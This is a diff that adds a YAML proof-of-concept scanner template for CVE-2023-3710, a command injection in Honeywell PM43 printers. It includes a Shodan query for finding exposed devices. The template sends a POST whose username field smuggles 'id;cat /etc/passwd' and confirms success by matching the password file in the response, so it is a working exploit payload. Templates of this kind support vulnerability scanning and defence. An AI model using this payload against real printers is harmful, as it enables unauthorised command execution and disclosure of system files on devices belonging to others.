@@ -1,0 +1,26 @@
+id: poc-yaml-honeywell-pm43-printers-command-injection
+info:
+  name: Honeywell PM43 打印机命令注入漏洞(CVE-2023-3710)
+  severity: critical
+  tags:
+  - CVE-2023-3710
+  - 两高一弱
+  finger: Honeywell PM43
+  shodan: http.html:"/main/login.lua?pageid="
+requests:
+- method: POST
+  path: /loadfile.lp?pageid=Configure
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=x%0aid;cat+/etc/passwd%0a&userpassword=1
+  expression: 'status_code == 200
+
+    && contains(body,"uid")
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    '
+variables: {}
+transport: http
